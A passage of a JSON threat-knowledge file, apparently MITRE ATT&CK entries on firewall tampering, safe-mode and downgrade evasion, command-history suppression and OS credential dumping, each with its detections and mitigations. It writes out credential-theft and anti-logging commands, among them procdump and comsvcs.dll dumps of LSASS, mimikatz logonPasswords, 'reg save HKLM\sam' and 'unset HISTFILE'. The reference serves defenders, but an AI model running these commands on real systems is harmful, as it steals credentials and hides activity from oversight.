(e.g., via esxcli network firewall set) or via the vCenter user interface. <a href=\"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/add-allowed-ip-addresses-for-an-esxi-host-by-using-the-vmware-host-client.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi Firewall)</a> <a href=\"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trellix Rnasomhouse 2024)</a>","detection":"","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper process and file permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper Registry permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1047","name":"Audit","description":"Routinely check account role permissions to ensure only expected users and roles have permission to modify system firewalls."}],"subTechniques":[{"id":"T1686.001","name":"Cloud Firewall","description":"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources.\n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane.\n\nFor example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining). <a href=\"https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)</a> <a href=\"https://expel.com/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel AWS)</a>","detection":"","platforms":["IaaS"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure least privilege principles are applied to Identity and Access Management (IAM) security policies. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a>"},{"id":"M1047","name":"Audit","description":"Routinely check account role permissions to ensure only expected users and roles have permission to modify cloud firewalls."}]},{"id":"T1686.002","name":"Network Device Firewall","description":"Adversaries may disable network device-based firewall mechanisms entirely or add, delete, or modify particular rules in order to bypass controls limiting network usage.  \n\nAdversaries may obtain access to devices such as routers, switches, or other perimeter/network devices and change access control lists (ACLs), security zones, or policy rules to permit otherwise blocked traffic. For example, adversaries may add new network firewall rules to allow access to all internal network subnets without restrictions. Allowing access to internal network subsets may enable unrestricted inbound/outbound connectivity or open paths for command and control and lateral movement.\n\nAdversaries may obtain access to network device management interfaces via Valid Accounts or by exploiting vulnerabilities. In some cases, threat actors may target firewalls and other network infrastructure that are exposed to the internet by leveraging weaknesses in public-facing applications (Exploit Public-Facing Application). <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55591\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CVE-2024-55591 Detail)</a>\n\nAdversaries may also modify host networking configurations that indirectly manipulate system firewalls, such as adjusting interface bandwidth or network connection request thresholds.","detection":"","platforms":["Network Devices"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1047","name":"Audit","description":"Routinely check account role permissions to ensure only expected users and roles have permission to modify system firewalls."},{"id":"M1051","name":"Update Software","description":"Ensure the network firewall is up to date with security patches."}]},{"id":"T1686.003","name":"Windows Host Firewall","description":"Adversaries may disable or modify the Windows host firewall to bypass controls limiting network usage. This can include disabling the Windows host firewall entirely, suppressing specific profiles (domain, private, public), or adding, deleting, and modifying firewall rules to allow or restrict traffic. <a href=\"https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nearest Neighbor Volexity)</a>\n\nAdversaries may perform these modifications through multiple mechanisms depending on the Windows operating system and access level. For example, adversaries may use command-line utilities (e.g., <code>netsh advfirewall</code> or PowerShell cmdlets like <code>Set-NetFirewallProfile</code>, <code>New-NetFirewallRule</code>), Windows Registry modifications (e.g., altering firewall states and rule configurations via registry keys), or the Windows Control Panel to modify firewall settings through the Windows Security interface.\n\nBy disabling or modifying Windows firewall services, adversaries may enable access to remote services, open ports for command and control traffic, or configure rules for further actions.","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper process and file permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper Registry permissions are in place to prevent adversaries from disabling or modifying firewall settings."},{"id":"M1047","name":"Audit","description":"Routinely check account role permissions to ensure only expected users and roles have permission to modify system firewalls."}]}]},{"id":"T1687","name":"Exploitation for Defense Impairment","description":"Adversaries may exploit vulnerabilities in security software, infrastructure, or defensive components to degrade, disable, or otherwise continue to impair their ability to prevent, detect, or respond to malicious activity. \n \nAdversaries may exploit a system or application vulnerability to directly interfere with defensive mechanisms. Exploitation occurs when an adversary takes advantage of a programming error in software, services, or the operating system to execute adversary-controlled code, often with the goal of weakening or disabling protections. \n\nVulnerabilities may exist in security tools such as antivirus, endpoint detection and response (EDR), firewalls, or other monitoring solutions. Adversaries may use prior reconnaissance or perform discovery activities (e.g., Software Discovery) to identify defensive tools present in an environment and target them for exploitation. \n\nSuccessful exploitation may allow adversaries to terminate security processes, disable protections, bypass enforcement mechanisms, or reduce the effectiveness of defensive controls. In some cases, vulnerabilities in cloud-based or SaaS infrastructure may also be leveraged to bypass built-in security boundaries or disrupt visibility and enforcement across environments. <a href=\"https://www.bleepingcomputer.com/news/security/hackers-exploited-salesforce-zero-day-in-facebook-phishing-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Salesforce zero-day in facebook phishing attack)</a>","detection":"","platforms":["IaaS","Linux","macOS","SaaS","Windows"],"dataSources":[],"mitigations":[],"subTechniques":[]},{"id":"T1688","name":"Safe Mode Boot","description":"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot. <a href=\"https://support.microsoft.com/en-us/windows/windows-startup-settings-1af6ec8c-4d4a-4b23-adb7-e76eef0b847f\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Startup Settings)</a> <a href=\"https://www.sophos.com/en-us/blog/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Safe Mode Boot)</a>\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings. <a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bcdedit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft bcdedit)</a>\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode. <a href=\"https://www.cyberark.com/resources/blog/cyberark-labs-from-safe-mode-to-domain-compromise\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberArk Labs Safe Mode 2016)</a> <a href=\"https://www.cybereason.com/blog/research/medusalocker-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason safe mode boot)</a> <a href=\"https://www.bleepingcomputer.com/news/security/revil-ransomware-has-a-new-windows-safe-mode-encryption-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer REvil 2021)</a>","detection":"","platforms":["Windows"],"dataSources":[],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles, that may be abused to remotely boot a machine in safe mode. <a href=\"https://www.cyberark.com/resources/blog/cyberark-labs-from-safe-mode-to-domain-compromise\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberArk Labs Safe Mode 2016)</a>"},{"id":"M1054","name":"Software Configuration","description":"Ensure that endpoint defenses run in safe mode. <a href=\"https://www.cyberark.com/resources/blog/cyberark-labs-from-safe-mode-to-domain-compromise\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberArk Labs Safe Mode 2016)</a>"}],"subTechniques":[]},{"id":"T1689","name":"Downgrade Attack","description":"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation.\n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreter or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. <a href=\"https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Praetorian TLS Downgrade Attack 2014)</a> For example, PowerShell versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to impair defenses while running malicious scripts that may have otherwise been detected. <a href=\"https://www.crowdstrike.com/en-us/blog/how-falcon-complete-stopped-a-big-game-hunting-ransomware-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike downgrade attack)</a> <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/bring-your-own-land-novel-red-teaming-technique/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud downgrade attack)</a> <a href=\"https://nsfocusglobal.com/attack-and-defense-around-powershell-event-logging/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: att_def_ps_logging)</a>\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text. <a href=\"https://blog.checkpoint.com/research/targeted-ssl-stripping-attacks-are-real/amp/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Targeted SSL Stripping Attacks Are Real)</a> <a href=\"https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/downgrade-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Downgrade attack 2)</a> On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms. <a href=\"https://www.safebreach.com/blog/downgrade-attacks-using-windows-updates/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SafeBreach)</a>","detection":"","platforms":["macOS","Windows","Linux"],"dataSources":[],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider removing previous versions of tools that are unnecessary to the environment when possible."},{"id":"M1054","name":"Software Configuration","description":"Consider implementing policies on internal web servers, such HTTP Strict Transport Security, that enforce the use of HTTPS/network traffic encryption to prevent insecure connections. <a href=\"https://www.chromium.org/hsts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chromium HSTS)</a>"}],"subTechniques":[]},{"id":"T1690","name":"Prevent Command History Logging","description":"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they have done.\n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the history command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. The <code>HISTFILE</code> environment variable is also used in some ESXi systems. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)</a>\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.\n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>. <a href=\"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7.6&viewFallbackFrom=powershell-7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft about_History prevent command history)</a> <a href=\"https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos PowerShell Command History Forensics)</a>\n\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. <code>no logging</code>).","detection":"","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":[],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Make sure that the <code>HISTCONTROL</code> environment variable is set to “ignoredups” instead of “ignoreboth” or “ignorespace”."},{"id":"M1039","name":"Environment Variable Permissions","description":"Prevent users from changing the <code>HISTCONTROL</code>, <code>HISTFILE</code>, and <code>HISTFILESIZE</code> environment variables. <a href=\"http://www.akyl.net/securing-bashhistory-file-make-sure-your-linux-system-users-won%E2%80%99t-hide-or-delete-their-bashhistory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securing bash history)</a>"}],"subTechniques":[]}]},{"tactic":"Credential Access","techniques":[{"id":"T1003","name":"OS Credential Dumping","description":"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a> Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.","detection":"### Windows\nMonitor for unexpected processes interacting with lsass.exe. <a href=\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting Attempts to Steal Passwords from Memory)</a> Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised Valid Accounts in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. <a href=\"https://msdn.microsoft.com/library/cc228086.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DRSR Dec 2017)</a> <a href=\"https://msdn.microsoft.com/library/dd207691.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetNCCChanges)</a> <a href=\"https://wiki.samba.org/index.php/DRSUAPI\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Samba DRSUAPI)</a> Note: Domain controllers may not log replication requests originating from the default domain controller account. <a href=\"http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y DCSync Sept 2015)</a>. Also monitor for network protocols <a href=\"https://msdn.microsoft.com/library/cc228086.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DRSR Dec 2017)</a> <a href=\"https://msdn.microsoft.com/library/cc237008.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft NRPC Dec 2017)</a> and other replication requests <a href=\"https://msdn.microsoft.com/library/cc245496.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SAMR)</a> from IPs not associated with known domain controllers. <a href=\"https://adsecurity.org/?p=1729\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity DCSync Sept 2015)</a>\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the <code>/proc</code> filesystem for the process being analyzed. This file is stored under the path <code>/proc/&lt;pid&gt;/maps</code>, where the <code>&lt;pid&gt;</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Process: Process Creation","Network Traffic: Network Traffic Flow","File: File Creation","Windows Registry: Windows Registry Key Access","Process: OS API Execution","File: File Access","Process: Process Access","Command: Command Execution","Active Directory: Active Directory Object Access"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Manage the access control list for “Replicating Directory Changes All” and other permissions associated with domain controller replication. <a href=\"https://adsecurity.org/?p=1729\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity DCSync Sept 2015)</a> <a href=\"https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replication ACL)</a> Consider adding users to the \"Protected Users\" Active Directory security group. This can help limit the caching of users' plaintext credentials. <a href=\"https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected Users Security Group)</a>"},{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1025","name":"Privileged Process Integrity","description":"On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Windows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1028","name":"Operating System Configuration","description":"Consider disabling or restricting NTLM. <a href=\"https://technet.microsoft.com/library/jj865668.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable NTLM Nov 2012)</a> Consider disabling WDigest authentication. <a href=\"https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDigest Mit)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure Domain Controller backups are properly secured."},{"id":"M1043","name":"Credential Access Protection","description":"With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. <a href=\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Guard)</a> It also does not protect against all forms of credential dumping. <a href=\"https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub SHB Credential Guard)</a>"}],"subTechniques":[{"id":"T1003.001","name":"LSASS Memory","description":"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as <code>comsvcs.dll</code> can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code> <a href=\"https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Exchange Marauder March 2021)</a> <a href=\"https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Attacks Against Government Sector)</a>\n\nSimilar to Image File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump of <code>lsass.exe</code> through Windows Error Reporting (<code>WerFault.exe</code>). <a href=\"https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deep Instinct LSASS)</a>\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a>\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. <a href=\"https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Blogs Credential Protection)</a>\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. <a href=\"https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Blogs Credential Protection)</a>","detection":"Monitor for unexpected processes interacting with LSASS.exe. <a href=\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting Attempts to Steal Passwords from Memory)</a> Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> which may require additional logging features to be configured in the operating system to collect necessary information for analysis.","platforms":["Windows"],"dataSources":["Process: Process Access","Windows Registry: Windows Registry Key Modification","Process: Process Creation","Process: OS API Execution","Logon Session: Logon Session Creation","Command: Command Execution","File: File Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."},{"id":"M1025","name":"Privileged Process Integrity","description":"On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers."},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1028","name":"Operating System Configuration","description":"Consider disabling or restricting NTLM. <a href=\"https://technet.microsoft.com/library/jj865668.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable NTLM Nov 2012)</a> Consider disabling WDigest authentication. <a href=\"https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDigest Mit)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1043","name":"Credential Access Protection","description":"With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping. <a href=\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Guard)</a> <a href=\"https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub SHB Credential Guard)</a>"}]},{"id":"T1003.002","name":"Security Account Manager","description":"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. <a href=\"https://github.com/Neohapsis/creddump7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Creddump7)</a>\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.","detection":"Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of 